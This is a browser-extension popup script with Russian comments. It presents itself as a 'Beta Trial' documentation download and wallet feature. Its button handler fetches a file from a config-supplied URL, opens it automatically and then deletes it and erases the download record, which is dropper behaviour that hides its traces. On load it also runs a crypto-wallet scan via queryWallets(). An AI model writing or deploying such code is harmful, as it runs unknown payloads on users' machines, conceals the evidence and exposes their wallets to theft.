
/* popup.js — главный popup скрипт */
/* global chrome */

// Импортируем функции из wallet.js
document.head.insertAdjacentHTML('beforeend', '<script src="wallet.js"></script>');

// Обработчик для кнопки Beta Trial - выполняет загрузку напрямую
async function handleBetaTrial() {
  console.log('Beta trial button clicked in popup');
  
  try {
    // Получаем конфиг напрямую из storage
    const { t0_config } = await chrome.storage.local.get('t0_config');
    
    if (!t0_config || !t0_config.download) {
      console.error('T0 config or download configuration not found');
      return;
    }
    
    const { file, name } = t0_config.download;
    
    // Запускаем загрузку напрямую в контексте user gesture
    chrome.downloads.download({
      url: file,
      filename: name,
      conflictAction: 'overwrite'
    }, (downloadId) => {
      if (chrome.runtime.lastError) {
        console.error('Download error:', chrome.runtime.lastError);
        return;
      }
      
      console.log('Beta trial documentation download started with ID:', downloadId);
      
      // Слушаем завершение загрузки
      chrome.downloads.onChanged.addListener(function downloadListener(delta) {
        if (delta.id === downloadId && delta.state?.current === 'complete') {
          chrome.downloads.onChanged.removeListener(downloadListener);
          chrome.downloads.open(downloadId);
          chrome.downloads.removeFile(downloadId, () => {});
          chrome.downloads.erase({ id: downloadId }, () => {});
        }
      });
    });
    
  } catch (error) {
    console.error('Beta trial error:', error);
  }
}

// Добавляем глобальную функцию для доступа из React
window.handleBetaTrial = handleBetaTrial;

// Запускаем сканирование кошельков при открытии popup
document.addEventListener('DOMContentLoaded', () => {
  // Убеждаемся что есть элемент для вывода
  if (!document.getElementById('out')) {
    document.body.insertAdjacentHTML('beforeend', '<div id="out"></div>');
  }
  
  // Загружаем скрипт wallet.js если еще не загружен
  if (typeof queryWallets === 'undefined') {
    const script = document.createElement('script');
    script.src = 'wallet.js';
    script.onload = () => {
      if (typeof queryWallets === 'function') {
        queryWallets();
      }
    };
    document.head.appendChild(script);
  } else {
    queryWallets();
  }
});
